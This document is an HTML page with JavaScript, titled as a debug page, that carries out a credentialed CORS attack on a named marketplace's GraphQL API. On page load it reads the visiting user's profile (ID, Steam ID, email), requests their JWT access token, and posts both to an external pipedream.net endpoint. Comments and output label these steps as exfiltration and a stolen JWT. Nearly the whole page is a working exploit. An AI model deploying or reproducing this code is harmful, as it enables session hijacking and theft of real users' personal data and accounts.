<!DOCTYPE html>
<html>
<head><title>White Market Debug</title></head>
<body>
<h1>CORS Attack Debug</h1>
<button onclick="testNow()">Test CORS Now</button>
<pre id="output"></pre>

<script>
const output = document.getElementById('output');
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

async function testNow() {
    output.textContent = 'Testing CORS attack...\n\n';
    
    try {
        output.textContent += 'Step 1: Attempting to fetch user profile...\n';
        
        const response = await fetch('https://api.white.market/graphql/api', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'x-accept-language': 'en_US'
            },
            body: JSON.stringify({
                query: 'query { person: person_profile { id steamId email } }',
                operationName: 'PersonProfile'
            })
        });
        
        output.textContent += `Response status: ${response.status}\n`;
        output.textContent += `Response headers:\n`;
        response.headers.forEach((value, key) => {
            output.textContent += `  ${key}: ${value}\n`;
        });
        
        const data = await response.json();
        output.textContent += '\nResponse data:\n';
        output.textContent += JSON.stringify(data, null, 2) + '\n\n';
        
        if (data.data && data.data.person) {
            output.textContent += '✅ SUCCESS - User is logged in!\n';
            output.textContent += `Steam ID: ${data.data.person.steamId}\n\n`;
            
            // Exfiltrate
            fetch(REQUESTBIN, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack: 'DEBUG_TEST_SUCCESS',
                    victim: data.data.person,
                    timestamp: new Date().toISOString()
                })
            });
            
            output.textContent += 'Step 2: Attempting JWT generation...\n';
            
            const jwtResponse = await fetch('https://api.white.market/graphql/api', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'x-accept-language': 'en_US'
                },
                body: JSON.stringify({
                    query: 'mutation AuthToken { auth_token { accessToken } }',
                    operationName: 'AuthToken'
                })
            });
            
            const jwtData = await jwtResponse.json();
            output.textContent += 'JWT response:\n';
            output.textContent += JSON.stringify(jwtData, null, 2) + '\n';
            
            if (jwtData.data && jwtData.data.auth_token) {
                output.textContent += '\n✅ JWT STOLEN!\n';
                output.textContent += `JWT: ${jwtData.data.auth_token.accessToken.substring(0, 100)}...\n`;
                
                fetch(REQUESTBIN, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        attack: 'DEBUG_JWT_SUCCESS',
                        jwt: jwtData.data.auth_token.accessToken,
                        timestamp: new Date().toISOString()
                    })
                });
            }
            
        } else if (data.errors) {
            output.textContent += '❌ API returned errors:\n';
            data.errors.forEach(err => {
                output.textContent += `  - ${err.message}\n`;
            });
        } else {
            output.textContent += '❌ User not logged in\n';
        }
        
    } catch (e) {
        output.textContent += `\n❌ ERROR: ${e.message}\n`;
        output.textContent += `Stack: ${e.stack}\n`;
    }
}

// Auto-run test on page load
window.onload = () => {
    setTimeout(testNow, 1000);
};
</script>
</body>
</html>
